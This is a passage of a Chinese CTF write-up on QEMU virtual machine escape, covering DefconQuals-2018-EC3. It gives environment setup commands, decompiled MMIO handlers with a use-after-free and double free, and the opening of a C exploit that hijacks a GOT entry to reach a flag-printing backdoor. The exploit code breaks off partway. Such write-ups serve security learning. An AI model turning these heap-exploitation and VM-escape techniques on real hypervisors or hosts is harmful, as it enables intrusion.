+    <span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// w</span>
+    <span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// w</span>
+    <span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// s</span>
+    <span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// s</span>
+    <span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// a</span>
+    <span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// d</span>
+    <span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// a</span>
+    <span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// d</span>
+    <span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// B</span>
+    <span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// A</span>
+    <span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// B</span>
+    <span class="token function">mmio_write</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// A</span>
+
+    <span class="token function">mmio_read</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// exec</span>
+
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>写exp过程中由于mmap映射空间不够导致segment fault。</p>
+<h1 id="DefconQuals-2018-EC3"><a href="#DefconQuals-2018-EC3" class="headerlink" title="DefconQuals-2018-EC3"></a>DefconQuals-2018-EC3</h1><h2 id="运行问题排除"><a href="#运行问题排除" class="headerlink" title="运行问题排除"></a>运行问题排除</h2><p>首先这个qemu需要在ubuntu18.04环境下运行，缺少更多的库。在18.04下运行需要安装这些库：</p>
+<p><strong>libiscsi：</strong></p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/sahlberg/libiscsi.git 
+./autogen.sh 
+./configure 
+<span class="token function">make</span> 
+<span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span> 
+<span class="token function">cp</span> /usr/lib/x86_64-linux-gnu/libiscsi.so.7 /lib/libiscsi.so.2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>安装libtool和libsysfs-dev：</strong></p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> libtool 
+<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> libsysfs-dev<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><strong>安装libpng12：</strong></p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">wget</span> -O /tmp/libpng12.deb http://mirrors.kernel.org/ubuntu/pool/main/libp/libpng/libpng12-0_1.2.54-1ubuntu1_amd64.deb 
+<span class="token function">sudo</span> dpkg -i /tmp/libpng12.deb 
+<span class="token function">sudo</span> <span class="token function">rm</span> /tmp/libpng12.deb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><strong>安裝 libxen4.6</strong></p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">wget</span> -O /tmp/libxen.deb http://mirrors.kernel.org/ubuntu/pool/main/x/xen/libxen-4.6_4.6.5-0ubuntu1.4_amd64.deb 
+<span class="token function">sudo</span> dpkg -i /tmp/libxen.deb 
+<span class="token function">sudo</span> <span class="token function">rm</span> /tmp/libxen.deb <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h2 id="逆向分析-1"><a href="#逆向分析-1" class="headerlink" title="逆向分析"></a>逆向分析</h2><p>根据之前的经验很容易找到相关的驱动函数，在这道题里面，重要的就是mmio_write和mmio_read函数：</p>
+<p>ooo_mmio_read函数：</p>
+<pre class="line-numbers language-c"><code class="language-c">__int64 __fastcall <span class="token function">ooo_mmio_read</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> a3<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">signed</span> <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+34h] [rbp-1Ch]</span>
+  __int64 dest<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+38h] [rbp-18h] BYREF</span>
+
+  dest<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  dest<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> a1<span class="token punctuation">;</span>
+  dest<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x42069LL</span><span class="token punctuation">;</span>
+  v4 <span class="token operator">=</span> <span class="token punctuation">(</span>a2 <span class="token operator">&amp;</span> <span class="token number">0xF0000u</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>a2 <span class="token operator">&amp;</span> <span class="token number">0xF00000u</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">20</span> <span class="token operator">!=</span> <span class="token number">15</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>bss_qword_1317940 <span class="token operator">+</span> v4<span class="token punctuation">)</span> <span class="token punctuation">)</span>
+    <span class="token function">memcpy</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>bss_qword_1317940 <span class="token operator">+</span> v4<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>__int16<span class="token punctuation">)</span>a2<span class="token punctuation">,</span> a3<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> dest<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>ooo_mmio_write函数：</p>
+<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">ooo_mmio_write</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">,</span> __int64 value<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> a4<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  _DWORD value_n<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+4h] [rbp-3Ch] BYREF</span>
+  __int64 v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-30h]</span>
+  __int64 v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-28h]</span>
+  __int16 v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+22h] [rbp-1Eh]</span>
+  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+24h] [rbp-1Ch]</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+28h] [rbp-18h]</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v10<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+2Ch] [rbp-14h]</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v11<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+34h] [rbp-Ch]</span>
+  __int64 v12<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+38h] [rbp-8h]</span>
+
+  v6 <span class="token operator">=</span> a1<span class="token punctuation">;</span>
+  v5 <span class="token operator">=</span> a2<span class="token punctuation">;</span>
+  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>value_n<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>
+  v12 <span class="token operator">=</span> a1<span class="token punctuation">;</span>
+  v9 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>a2 <span class="token operator">&amp;</span> <span class="token number">0xF00000</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">20</span><span class="token punctuation">;</span>
+  <span class="token keyword">switch</span> <span class="token punctuation">(</span> v9 <span class="token punctuation">)</span>
+  <span class="token punctuation">{</span>
+    <span class="token keyword">case</span> <span class="token number">1u</span><span class="token punctuation">:</span>                                    <span class="token comment" spellcheck="true">// double free???</span>
+      <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>bss_qword_1317940 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v5 <span class="token operator">&amp;</span> <span class="token number">0xF0000</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token keyword">break</span><span class="token punctuation">;</span>
+    <span class="token keyword">case</span> <span class="token number">2u</span><span class="token punctuation">:</span>                                    <span class="token comment" spellcheck="true">// write value</span>
+      v11 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v5 <span class="token operator">&amp;</span> <span class="token number">0xF0000</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">;</span>
+      v7 <span class="token operator">=</span> v5<span class="token punctuation">;</span>
+      <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>bss_qword_1317940 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v11<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>__int16<span class="token punctuation">)</span>v5<span class="token punctuation">,</span> <span class="token operator">&amp;</span>value_n<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> a4<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token keyword">break</span><span class="token punctuation">;</span>
+    <span class="token keyword">case</span> <span class="token number">0u</span><span class="token punctuation">:</span>                                    <span class="token comment" spellcheck="true">// malloc</span>
+      v10 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v5 <span class="token operator">&amp;</span> <span class="token number">0xF0000</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// index</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span> v10 <span class="token operator">==</span> <span class="token number">0xF</span> <span class="token punctuation">)</span>
+      <span class="token punctuation">{</span>
+        <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">14</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
+          <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>bss_qword_1317940 <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8LL</span> <span class="token operator">*</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>value_n<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token punctuation">}</span>
+      <span class="token keyword">else</span>
+      <span class="token punctuation">{</span>
+        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>bss_qword_1317940 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v10<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8LL</span> <span class="token operator">*</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>value_n<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token punctuation">}</span>
+      <span class="token keyword">break</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>跟上面的题类似，通过对参数进行计算作为cmd选择，</p>
+<p>cmd为0：malloc(传入的value)<br>cmd为1：释放buf[index] chunk<br>cmd为2：将value写入*buf[index]+offset</p>
+<p>很明显的UAF漏洞</p>
+<p>还有一个后门函数：backdoor有system(“cat ./flag”)</p>
+<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">backdoor</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>
+  <span class="token keyword">unsigned</span> __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+28h] [rbp-8h]</span>
+
+  v3 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  v1 <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat ./flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span> v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">sub_999B79</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">2520</span><span class="token punctuation">,</span> <span class="token string">"hw/misc/oooverflow.c"</span><span class="token punctuation">,</span> <span class="token number">302LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">2624</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+  <span class="token function">sub_999C8A</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">2520</span><span class="token punctuation">,</span> <span class="token string">"hw/misc/oooverflow.c"</span><span class="token punctuation">,</span> <span class="token number">304LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">sub_999E2D</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">2568</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">sub_99A8FD</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">2512</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">sub_999DCD</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">2568</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">sub_999B19</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">2520</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">sub_994A52</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">2680</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>那么很容易反应过来是劫持函数了，再看看保护机制确认无疑了</p>
+<div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/23/chu-tan-qemu-tao-yi/28.png"></div>
+
+<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>容易想到的是劫持got表为backdoor，调用后拿到flag</p>
+<h2 id="调试-amp-exp"><a href="#调试-amp-exp" class="headerlink" title="调试&amp;exp"></a>调试&amp;exp</h2><p>2.27环境下double free劫持got表，难度不大，写exp遇到些问题，主要就是c定义的变量类型有问题</p>
+<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;inttypes.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/io.h></span></span>
+
+<span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>mmio_mem<span class="token punctuation">;</span>
+
+uint64_t <span class="token function">mmio_read</span><span class="token punctuation">(</span>uint32_t offset<span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">return</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>uint32_t<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>mmio_mem<span class="token operator">+</span>offset<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">void</span> <span class="token function">mmio_write</span><span class="token punctuation">(</span>uint64_t offset<span class="token punctuation">,</span>uint64_t value<span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>uint32_t<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>mmio_mem<span class="token operator">+</span>offset<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+
+<span class="token keyword">void</span> <span class="token function">mmio_malloc</span><span class="token punctuation">(</span>uint8_t index<span class="token punctuation">,</span>uint32_t size<span class="token punctuation">)</span><span class="token punctuation">{</span>
+    uint32_t offset <span class="token operator">=</span> <span class="token punctuation">(</span>index<span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">&lt;&lt;</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    uint32_t value <span class="token operator">=</span> size<span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">;</span>
+    <span class="token function">mmio_write</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">void</span> <span class="token function">mmio_free</span><span class="token punctuation">(</span>uint8_t index<span class="token punctuation">)</span><span class="token punctuation">{</span>
+    uint64_t offset <span class="token operator">=</span> <span class="token number">0x100000</span><span class="token punctuation">;</span>
+    offset<span class="token operator">+</span><span class="token operator">=</span> index<span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">;</span>
+    uint64_t value <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    <span class="token function">mmio_write</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">void</span> <span class="token function">mmio_edit</span><span class="token punctuation">(</span>uint64_t index<span class="token punctuation">,</span>uint16_t offset1<span class="token punctuation">,</span>uint64_t value<span class="token punctuation">)</span><span class="token punctuation">{</span>
+    uint64_t offset <span class="token operator">=</span> <span class="token number">0x200000</span><span class="token punctuation">;</span>
+    offset<span class="token operator">+</span><span class="token operator">=</span> index<span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">;</span>
+    offset<span class="token operator">+</span><span class="token operator">=</span> offset1<span class="token punctuation">;</span>
+    <span class="token function">mmio_write</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">void</span> <span class="token function">exit0</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> msg<span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token function">perror</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">int</span> mmio_fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/sys/devices/pci0000:00/0000:00:04.0/resource0"</span><span class="token punctuation">,</span> O_RDWR <span class="token operator">|</span> O_SYNC<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span>mmio_fd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token function">exit0</span><span class="token punctuation">(</span><span class="token string">"mopen failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    mmio_mem <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x1000000</span><span class="token punctuation">,</span>PROT_READ <span class="token operator">|</span> PROT_WRITE<span class="token punctuation">,</span> MAP_SHARED<span class="token punctuation">,</span> mmio_fd<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span>mmio_mem <span class="token operator">==</span> MAP_FAILED<span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token function">exit0</span><span class="token punctuation">(</span><span class="token string">"mmap failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] mmio_mem address ==> %p\n"</span><span class="token punctuation">,</span>mmio_mem<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    uint32_t backdoor_addr <span class="token operator">=</span> <span class="token number">0x6E65F9</span><span class="token punctuation">;</span>
+    uint32_t free_got <span class="token operator">=</span> <span class="token number">0x11301a0</span><span class="token punctuation">;</span>
+    <span class="token function">mmio_malloc</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x360</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">mmio_malloc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x360</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment" spellcheck="true">// mmio_malloc(2,0x60);</span>
+    <span class="token function">mmio_edit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">mmio_free</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">mmio_free</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">mmio_free</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">mmio_free</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
